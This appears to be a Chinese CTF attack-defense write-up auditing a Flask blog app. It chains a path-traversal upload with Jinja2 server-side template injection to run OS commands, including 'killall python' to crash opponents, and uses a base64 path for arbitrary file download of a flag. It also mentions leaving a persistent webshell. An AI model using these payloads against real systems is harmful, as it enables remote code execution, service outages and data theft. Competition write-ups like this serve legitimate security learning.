所以我的目标一下落在了hello这个奇怪路由上
    @auth.route('/hello')
    def hello():
        html=open('/var/www/html/flasky/app/templates/test.txt','r')
        template = Template(html.read())
        return template.render()
这个路由会渲染
    /var/www/html/flasky/app/templates/
目录下的test.txt文件，但是目前这个文件夹下的test.txt是一个正经的文件，我们需要一个任意文件写入，或者上传的点，这个点我们先mark下来！后续会进行利用
## main文件夹
该文件夹下有4个文件
    __init__.py
    errors.py
    forms.py
    views.py
其中
    __init__.py
用于初始化
    errors.py
用于处理403,404,500等状态
    forms.py
用于表单的接受处理，同样几乎不存在问题
    views.py
同样是路由，也是核心，有了上一个文件夹的经验，我们用同样的方法进行分析
    def allowed_file(filename):
    @main.after_app_request
    def after_request(response):
    @main.route('/shutdown')
    def server_shutdown():
    @main.route('/', methods=['GET', 'POST'])
    def index():
    @main.route('/user/')
    def user(username):
    @main.route('/edit-profile', methods=['GET', 'POST'])
    @login_required
    def edit_profile():
    @main.route('/edit-profile/', methods=['GET', 'POST'])
    @login_required
    @admin_required
    def edit_profile_admin(id):
    @main.route('/post/', methods=['GET', 'POST'])
    def post(id):
    @main.route('/upload', methods=['GET', 'POST'])
    @login_required
    def upload():
    @main.route('/edit/', methods=['GET', 'POST'])
    @login_required
    def edit(id):
    @main.route('/download/')
    @login_required
    def download(filename):
    @main.route('/follow/')
    @login_required
    @permission_required(Permission.FOLLOW)
    def follow(username):
    @main.route('/unfollow/')
    @login_required
    @permission_required(Permission.FOLLOW)
    def unfollow(username):
    @main.route('/followers/')
    def followers(username):
    @main.route('/followed-by/')
    def followed_by(username):
    @main.route('/all')
    @login_required
    def show_all():
    @main.route('/followed')
    @login_required
    def show_followed():
    @main.route('/moderate')
    @login_required
    @permission_required(Permission.MODERATE_COMMENTS)
    def moderate():
    @main.route('/moderate/enable/')
    @login_required
    @permission_required(Permission.MODERATE_COMMENTS)
    def moderate_enable(id):
    @main.route('/moderate/disable/')
    @login_required
    @permission_required(Permission.MODERATE_COMMENTS)
    def moderate_disable(id):
这里不难看出，大部分都是需要登录后的操作,因为这里我们还没有涉及登录，所以我们先看无需登录的路由
    @main.after_app_request
    def after_request(response):
    @main.route('/shutdown')
    def server_shutdown():
    @main.route('/', methods=['GET', 'POST'])
    def index():
    @main.route('/user/')
    def user(username):
    @main.route('/post/', methods=['GET', 'POST'])
    def post(id):
    @main.route('/followers/')
    def followers(username):
    @main.route('/followed-by/')
    def followed_by(username):
依次检查过去，除了shutdown()这个看起来就很可疑的路由外，其他的基本不存在问题。所以我们的重心来到shutdown()的分析
###  超坑的shutdown()
我们不难发现一个奇怪的路由
    @main.route('/shutdown')
    def server_shutdown():
        if not current_app.testing:
            abort(404)
        shutdown = request.environ.get('werkzeug.server.shutdown')
        if not shutdown:
            abort(500)
        shutdown()
        return 'Shutting down...'
一开始我以为这个访问之后就会使服务宕机  
但是测试了N久，发现都是抛出404  
后面我跟了一下这个
    current_app.testing
跟踪tesing
    testing = ConfigAttribute('TESTING')
继续跟踪ConfigAttribute()
    class ConfigAttribute(object):
        """Makes an attribute forward to the config"""
        def __init__(self, name, get_converter=None):
            self.__name__ = name
            self.get_converter = get_converter
        def __get__(self, obj, type=None):
            if obj is None:
                return self
            rv = obj.config[self.__name__]
            if self.get_converter is not None:
                rv = self.get_converter(rv)
            return rv
        def __set__(self, obj, value):
            obj.config[self.__name__] = value
发现TESTING是对象，查找默认配置
     default_config = ImmutableDict({
            'DEBUG': get_debug_flag(default=False),
            'TESTING': False,
            ......
    })
发现TESTING默认是False,由ConfigAttribute()传递给testing  
回到之前的判断
     if not current_app.testing:
            abort(404)
不难看出判断成立，所以abort()  
这里应该是出题人留的坑吧= =好像并不能使用
## 密码发掘
当然我们不会止步于目前的现状  
因为框架中main文件夹带有大量登录的功能，为了继续发掘，我们进行密码探寻  
显然数据库中存在唯一数据
    username:xdctf
    password_hash:pbkdf2:sha256:50000$ziAb6YfH$fa52620060a18fd86baf6b3b7f797cbcb325956898077752e8c14585aa3af044
直接破解不存在可能  
经过弱密码破解过了一会儿也没有结果  
最后我们选择直接尝试题目最开始的服务器初始密码  
没想到阴差阳错登录成功  
下面我们来探查需要登录的功能是否存在攻击点
## login之后的攻击
###  upload+SSTI攻击组合
想到之前的
    /auth/hello
路由的方法
    @auth.route('/hello')
    def hello():
        html=open('/var/www/html/flasky/app/templates/test.txt','r')
        template = Template(html.read())
        return template.render()
我们只要上传test.txt到指定目录即可  
此时我们看上传功能
    @main.route('/upload', methods=['GET', 'POST'])
    @login_required
    def upload():
        if request.method == 'POST':
            file = request.files['file']
            if file and allowed_file(file.filename):
                filename = file.filename
                file.save(os.path.join(UPLOAD_FOLDER, filename))
                return 'upload success'
            else:
                return 'dont allow'
        return render_template('upload.html',pagination=False)
此时存在过滤allowed_file()  
我们跟踪一下
    def allowed_file(filename):
        return '.' in filename and 
               filename.rsplit('.', 1)[1] in ALLOWED_EXTENSIONS
我们继续跟一下后缀白名单`ALLOWED_EXTENSIONS`
    ALLOWED_EXTENSIONS = set(['txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif','html'])
发现txt允许上传，根本无需Bypass  
我们再看上传路径
    file.save(os.path.join(UPLOAD_FOLDER, filename))
跟一下`UPLOAD_FOLDER`
    UPLOAD_FOLDER = '/tmp'
不难看出存在目录穿越问题  
对于文件名只检查了后缀名，而除此之外也不存在过滤  
所以我们可以构造这样的filename
    ../../../../../../../var/www/html/flasky/app/templates/test.txt
数据包
    ------WebKitFormBoundaryp48DQKUgx3itH8PS
    Content-Disposition: form-data; name="file"; filename="../../../../../../../var/www/html/flasky/app/templates/test.txt"
    Content-Type: text/plain
    {% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__ == 'catch_warnings' %}
    {{c.__init__.func_globals['linecache'].__dict__['os'].system('ls /') }}
    {% endif %}
    {% endfor %}
    ------WebKitFormBoundaryp48DQKUgx3itH8PS--    
我们去触发模板渲染  
不难看到
    bin    dev   initrd.img      lib64     mnt   root  snap  tmp    vmlinuz
    boot   etc   initrd.img.old  lost+found  opt   run   srv   usr    vmlinuz.old
    cdrom  home  lib         media     proc  sbin  sys   var
    192.168.130.1 - - [15/Apr/2018 05:33:59] "GET /auth/hello HTTP/1.1" 200 -    
我们成功触发了SSTI攻击  
此时只要效仿之前的SSTI打法即可
    {% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__ == 'catch_warnings' %}
    {{c.__init__.func_globals['linecache'].__dict__['os'].system('killall python') }}
    {% endif %}
    {% endfor %}
通杀宕机，稳坐拿分XD  
但是这样的方法也有些鸡肋  
毕竟登录+上传才可以触发  
通杀脚本想打20台机子，比较麻烦，还得挨个尝试默认密码登录获取session  
再模拟上传，再触发渲染导致攻击，所以这里的通杀脚本就不赘述了。
###  任意文件下载
    @main.route('/download/')
    @login_required
    def download(filename):
        filename=base64.b64decode(filename)
        f=open(filename,'r')
        return f.read()
上传过后自然想到的是下载，这里的下载也显然是毫无过滤的  
不难看出只需要构造
    /var/www/html/flag
再经过base64
    L3Zhci93d3cvaHRtbC9mbGFn
访问
    /download/L3Zhci93d3cvaHRtbC9mbGFn
即可下载flag文件
###  鸡肋鸡肋
但是比较痛苦的一点是  
登录后打击需要满足多个条件：
    1.你的对手没有发现数据库中留下的用户默认密码为服务器密码
    2.你的对手没有更改默认密码
同时，即便你这样做到了登录，并偷偷修改了对手的默认用户密码，一旦对手发现了这一点  
他们可以直接操纵数据库强行更改密码。这样你也无可奈何。毕竟我们没有邮箱注册的方法。  
除非我们能够迅速操作并留下不死马
## 总结
总得来看，这次的漏洞点还算都比较明显，应该出题人是尽责自己纯手写的代码了。当然在现场比赛的时候，静心审计代码并且快速利用还是有些困难的。希望自己能变的越来越好吧~  
当然有大师傅们有什么奇淫技巧也可以和我多多交流XD~